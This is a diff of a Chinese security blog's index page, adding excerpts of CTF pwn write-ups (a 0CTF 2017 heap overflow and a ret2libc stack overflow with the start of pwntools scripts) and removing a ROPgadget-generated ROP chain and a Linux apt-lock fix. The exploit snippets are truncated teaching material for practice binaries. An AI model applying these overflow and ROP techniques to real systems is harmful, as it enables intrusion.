@@ -134,6 +134,126 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/31/babyheap_0ctf_2017/">
+        <p class="h4 index-header">babyheap_0ctf_2017</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">babyheap_0ctf_2017参考wp:https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2
+
+===== Baby Heap in 2017 =====
+1. Allocate
+
+Command: 1
+Size: 300 
+Allocate Index 0
+
+2. Fill
+
+Command: 2   
+Index: 0
+Size: 400
+Content: 
+
+3. Free
+
+Command: 3
+Index: 3
+
+4. Dump
+
+Command: 4
+Index: 0
+
+5. Exit
+
+
+struct heap{
+    int ifExit;
+    int size;
+    char *str;
+}
+
+这里可以看见没有检查v4跟结构体里的size大小，并且是按照v4来输入的，这样就可以覆盖到下一块
+
+都设置为了0，这样就不能Use_after_free
+
+先写好必须的四个功能
+    def allocate(size):
+        s</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-31&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/">
+        <p class="h4 index-header">BrainOverFlow_Vol.1_BUU特供</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">
+
+BrainOverFlow_Vol.1_BUU特供很有意思（好玩）的游戏，感谢札哥的题
+
+btw，我也没想到我会是第六个解出来的hhhhh，我可以吹一个月（笑
+剧情我就不说了，反正很有意思的
+具体东西都藏在/www/data里边，每一次的地图数据（主要在Map013，15，22）都有，个人等级，姓名，武器售卖价值等都可以改hhhhh
+亏我三小时打通游戏，做了半天pwn以为是盲打，然后发现了文件就在图片旁边orz
+protect
+
+
+这图就是溢出点，buf空间只有0x40，但是却读入0xC8个，题目没有system和/bin/sh字段，就是ret2libc
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+elf = ELF(&#39;./protect&#39;)
+lib = 0
+sh = 0
+def pwn(ip,port,debug):
+    global lib
+    global sh
+    if de</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-30&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/01/29/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
         <p class="h4 index-header">堆的基础知识</p>
         
@@ -516,103 +636,11 @@ r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会�
     </div>
   </div>
 
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/13/ROPgadget-not_the_same_3dsctf_2016/">
-        <p class="h4 index-header">ROPgadget-not_the_same_3dsctf_2016</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">ROPgadget-not_the_same_3dsctf_2016
-
-ROPgadget --binary not_the_same_3dsctf_2016 --ropchain
-自动生成
-from struct import pack
-p = &#39;&#39;
-p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
-p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
-p += &#39;/bin&#39;
-p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
-p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
-p += p</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/buu">buu</a>&nbsp;
-          
-            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/11/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">
-        <p class="h4 index-header">Linux常见问题解决方法</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?
-ps -A | grep apt
-sudo kill -9 processnumber
-
-sudo rm /var/lib/dpkg/lock
-sudo rm /var/lib/dpkg/lock-frontend
-E: Could not get lock /var/cache/apt/archives/lock - open (11: Resource temporarily unavailable) 
-E: Unable to lock directory /var/cache/apt/archives/
-sudo killall apt-get
-
-sudo rm /var/lib/apt</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-11&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/Linux%E4%BD%BF%E7%94%A8">Linux使用</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/Linux%20%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3">Linux 问题解决</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
 
 
   <nav aria-label="index posts navigation">
     <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
-      <a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-double-right"></i></a>
+      <a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-double-right"></i></a>
     </span>
   </nav>
   
